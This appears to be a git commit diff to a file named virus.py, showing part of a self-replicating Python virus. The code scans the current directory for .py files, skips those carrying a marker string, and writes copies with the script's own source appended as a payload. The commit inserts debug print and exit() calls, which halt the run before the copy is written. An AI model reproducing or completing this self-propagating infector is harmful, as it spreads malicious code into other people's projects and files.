1ade87369cdbb24833a835ce25d855e406f02df4
Aaron Pop <FezFamiliar@yahoo.com>
2020-01-27 23:07:41 -0800

    fixed logical error

--- virus.py
+++ virus.py
@@ -26,7 +26,13 @@ def infect(PAYLOAD):
     i = 0
     for file in glob.glob("*.py"):
         f = open(file, "r")
-        if f.mode == 'r' and not re.search('^#### t45r6fye',f.read()):
+        
+        x = re.search('#### t45r6fye',f.read())
+        
+        if f.mode == 'r' and x == None:
+            f.seek(0)
+            print(f.read())
+            exit()
             infected = open('infected_'+str(i)+'.py','w')
             infected.write(f.read() + PAYLOAD)
             f.close()
@@ -40,6 +46,7 @@ def infect(PAYLOAD):
 
 with open(__file__,'r') as current_file:
     PAYLOAD = current_file.read()
+
 
 
 infect(PAYLOAD)
